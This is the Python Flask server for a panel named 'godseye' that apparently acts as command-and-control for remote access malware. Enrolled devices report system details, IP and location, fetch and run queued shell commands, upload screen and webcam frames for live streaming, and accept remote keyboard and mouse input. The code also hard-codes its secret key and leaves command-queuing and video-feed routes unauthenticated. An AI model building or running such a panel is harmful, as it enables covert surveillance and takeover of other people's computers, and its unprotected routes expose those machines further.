from flask import Flask, request, jsonify, render_template, send_from_directory, redirect, url_for, Response, flash
from models import db, Device, Command, User
from flask_login import LoginManager, login_user, logout_user, login_required, current_user
import os
import datetime
import time

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(app.root_path, 'godseye.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = os.path.join(app.root_path, 'static', 'screenshots')

app.config['SECRET_KEY'] = 'GODS_EYE_SECRET_PROTOCOLS'
db.init_app(app)

with app.app_context():
    db.create_all()

login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# --- Authentication Routes ---

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.check_password(password):
            login_user(user)
            return redirect(url_for('index'))
        flash('INVALID CREDENTIALS. ACCESS DENIED.', 'danger')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    # Registration is open for now, can be restricted later
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if User.query.filter_by(username=username).first():
            flash('ID ALREADY ASSIGNED TO ANOTHER AGENT.', 'warning')
        else:
            new_user = User(username=username)
            new_user.set_password(password)
            db.session.add(new_user)
            db.session.commit()
            flash('REGISTRATION COMPLETE. IDENTITY LOGGED.', 'success')
            return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

# Global queue for remote control events: {hardware_id: [events]}
input_queues = {}
# Global cache for latest frames to avoid file locking issues: {hardware_id: frame_bytes}
latest_frames = {}

# Ensure upload folder exists
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

# Removed before_first_request


@app.route('/')
@login_required
def index():
    devices = Device.query.all()
    return render_template('index.html', devices=devices)

@app.route('/device/<int:device_id>')
@login_required
def device_detail(device_id):
    device = Device.query.get_or_404(device_id)
    return render_template('device.html', device=device)

@app.route('/api/checkin', methods=['POST'])
def checkin():
    data = request.json
    hardware_id = data.get('hardware_id')
    
    device = Device.query.filter_by(hardware_id=hardware_id).first()
    
    if not device:
        device = Device(hardware_id=hardware_id, name=data.get('hostname'))
        db.session.add(device)
    
    device.name = data.get('hostname')
    device.os_info = data.get('os_info')
    device.cpu_usage = data.get('cpu')
    device.ram_usage = data.get('ram')
    device.total_ram = data.get('total_ram')
    device.ip_address = request.remote_addr
    device.last_seen = datetime.datetime.utcnow()
    device.is_online = True
    
    # Update location if provided (simple)
    if 'lat' in data and data['lat']:
         device.location_lat = data['lat']
         device.location_lon = data['lon']

    db.session.commit()
    
    # Fetch pending commands
    commands = Command.query.filter_by(device_id=device.id, status='pending').all()
    cmd_list = []
    for cmd in commands:
        cmd_list.append({'id': cmd.id, 'command': cmd.command_text})
        cmd.status = 'executed'
        cmd.executed_at = datetime.datetime.utcnow()
    
    db.session.commit()
    
    if cmd_list:
        print(f"Sending {len(cmd_list)} commands to {hardware_id}: {cmd_list}")
    
    return jsonify({'status': 'ok', 'commands': cmd_list})

@app.route('/api/command/result', methods=['POST'])
def command_result():
    data = request.json
    cmd_id = data.get('command_id')
    output = data.get('output')
    
    cmd = Command.query.get(cmd_id)
    if cmd:
        cmd.output = output
        cmd.status = 'executed' 
        cmd.executed_at = datetime.datetime.now()
        db.session.commit()
        print(f"Command {cmd_id} Result Saved: {output[:100]}...")
    
    return jsonify({'status': 'received'})


@app.route('/api/upload_screen/<hardware_id>', methods=['POST'])
def upload_screen(hardware_id):
    if 'file' not in request.files:
        return jsonify({'error': 'no file'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'no filename'}), 400
    
    # Save as latest.jpg for streaming reference
    filename = f"{hardware_id}_latest.jpg"
    path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file_bytes = file.read()
    with open(path, 'wb') as f:
        f.write(file_bytes)
    
    # Update memory cache
    latest_frames[hardware_id] = file_bytes
    
    return jsonify({'status': 'uploaded'})

@app.route('/api/upload_cam/<hardware_id>', methods=['POST'])
def upload_cam(hardware_id):
    if 'file' not in request.files:
        return jsonify({'error': 'no file'}), 400
    file = request.files['file']
    
    filename = f"{hardware_id}_cam_latest.jpg"
    path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file_bytes = file.read()
    with open(path, 'wb') as f:
        f.write(file_bytes)
    
    # Update memory cache
    latest_frames[f"{hardware_id}_cam"] = file_bytes
    
    return jsonify({'status': 'uploaded'})

def generate_mjpeg_stream(hardware_id, file_suffix="_latest.jpg"):
    # Generator for MJPEG
    last_frame = None
    while True:
        try:
            # Check memory cache first for speed and to avoid locks
            frame = latest_frames.get(hardware_id if file_suffix == "_latest.jpg" else f"{hardware_id}_cam")
            
            # If not in cache or it's a cam feed we haven't cached yet, try disk
            if not frame:
                path = os.path.join(app.config['UPLOAD_FOLDER'], f"{hardware_id}{file_suffix}")
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        frame = f.read()
            
            if frame and frame != last_frame:
                last_frame = frame
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        except Exception:
            pass
        
        time.sleep(0.05)

@app.route('/video_feed/<int:device_id>')
def video_feed(device_id):
    device = Device.query.get_or_404(device_id)
    return Response(generate_mjpeg_stream(device.hardware_id),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/cam_feed/<int:device_id>')
def cam_feed(device_id):
    device = Device.query.get_or_404(device_id)
    return Response(generate_mjpeg_stream(device.hardware_id, "_cam_latest.jpg"),
                    mimetype='multipart/x-mixed-replace; boundary=frame')


# --- REMOTE CONTROL API ---

@app.route('/api/control/input/<int:device_id>', methods=['POST'])
def vehicle_input(device_id):
    # Retrieve hardware_id from device_id
    device = Device.query.get(device_id)
    if not device:
        return jsonify({'error': 'device not found'}), 404
        
    data = request.json
    hw_id = device.hardware_id
    
    if hw_id not in input_queues:
        input_queues[hw_id] = []
    
    # Limit queue size
    if len(input_queues[hw_id]) > 50:
        input_queues[hw_id].pop(0)

    input_queues[hw_id].append(data)
    return jsonify({'status': 'queued'})

@app.route('/api/control/pending/<hardware_id>', methods=['GET'])
def get_pending_input(hardware_id):
    if hardware_id in input_queues and input_queues[hardware_id]:
        events = list(input_queues[hardware_id]) # Copy
        input_queues[hardware_id] = [] # Clear
        return jsonify({'events': events})
    return jsonify({'events': []})


@app.route('/api/execute_command_ajax', methods=['POST'])
def execute_command_ajax():
    device_id = request.form.get('device_id')
    command_text = request.form.get('command')
    
    if device_id and command_text:
        new_cmd = Command(device_id=device_id, command_text=command_text)
        db.session.add(new_cmd)
        db.session.commit()
        return jsonify({'status': 'queued', 'command_id': new_cmd.id})
    return jsonify({'error': 'missing data'}), 400

@app.route('/api/execute_command', methods=['POST'])
def execute_command_api():
    device_id = request.form.get('device_id')
    command_text = request.form.get('command')
    
    if device_id and command_text:
        new_cmd = Command(device_id=device_id, command_text=command_text)
        db.session.add(new_cmd)
        db.session.commit()
    
    return redirect(url_for('device_detail', device_id=device_id))

@app.route('/api/command/history/<int:device_id>', methods=['GET'])
def get_command_history(device_id):
    cmds = Command.query.filter_by(device_id=device_id).order_by(Command.created_at.desc()).limit(20).all()
    return jsonify([c.to_dict() for c in cmds])

@app.route('/api/command/history/<int:device_id>', methods=['DELETE'])
def clear_history(device_id):
    # Delete all commands for this device (both pending and executed)
    try:
        Command.query.filter_by(device_id=device_id).delete()
        db.session.commit()
        return jsonify({'status': 'cleared'})
    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=False)
